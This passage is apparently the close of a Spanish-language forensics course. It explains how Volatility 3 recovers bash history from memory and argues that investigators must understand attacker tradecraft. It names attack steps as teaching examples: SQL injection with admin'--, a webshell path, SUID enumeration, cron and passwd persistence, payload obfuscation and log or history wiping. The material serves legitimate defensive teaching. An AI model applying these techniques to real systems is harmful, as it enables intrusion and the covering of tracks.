- En lenguaje C, liberar memoria en el *heap* (`free()`) **no sobrescribe con ceros (`zeroing`)** los bytes de las cadenas de texto previamente alojadas en las páginas de memoria RAM del proceso; simplemente marca esos bloques como disponibles para futuras asignaciones.
- Además, las cadenas también permanecen en los buffers de entrada/salida de la pseudo-terminal (`pts/0`) y en estructuras de la librería `readline`.
- Al capturar el volcado de memoria RAM antes de que el proceso se destruyera o esas páginas físicas fueran reutilizadas, el plugin **`linux.bash`** de **Volatility 3** escanea el espacio de direcciones virtuales del proceso `bash` (`PID 1240`) buscando las firmas de las estructuras `_hist_entry` y buffers de `readline`, permitiendo reconstruir íntegramente todos los comandos ejecutados, incluido el propio `history -c`.

---

### P5 — Cierre del curso: ¿por qué un buen forense tiene que entender cómo ataca un pentester?

Haber recorrido secuencialmente el arco ofensivo (**Labs 05–08**: Reconocimiento, Enumeración, Explotación y Post-explotación), la automatización con agentes (**Lab 09**), la detección en el SOC (**Lab 10**) y finalmente la investigación **DFIR (Lab 11)** demuestra que **la seguridad ofensiva y la forensia digital son la misma cadena causal leída en direcciones opuestas**:

1. **Saber qué buscar y dónde buscarlo (Hipótesis guiadas por la *Kill Chain*):** Un forense que no comprende cómo piensa ni opera un pentester se enfrenta a millones de líneas de logs y miles de archivos sin saber qué es anomalía y qué es operación normal. En cambio, quien ejecutó un ataque sabe que tras un barrido de `gobuster` (`access.log:7-12`) vendrá un intento de explotación (`POST /portal-rrhh/login` con `admin'--`), que tras lograr RCE el atacante buscará estabilidad subiendo un webshell en un directorio escribible (`/var/www/uploads/shell.php`), que como `www-data` enumerará binarios SUID (`find / -perm -4000`) y que, una vez `root`, plantará persistencia en `/etc/cron.d/` o `/etc/passwd`.
2. **Reconocer técnicas de evasión y Anti-Forensics:** Entender cómo un atacante ofusca payloads (`%20`, `/**/`), usa flags específicos como `-p` en binarios SUID o intenta borrar sus huellas (`history -c`, edición de `auth.log`) le permite al investigador anticipar el engaño y recurrir a artefactos volátiles en RAM o al journal del sistema.
3. **Remediación efectiva y realista:** Solo quien comprende la mecánica exacta de la vulnerabilidad explotada puede proponer en la sección de contención y erradicación defensas que cierren el problema de raíz (parametrización SQL, remoción de SUID, segmentación de red) en lugar de parches superficiales que el atacante volvería a sortear en minutos.
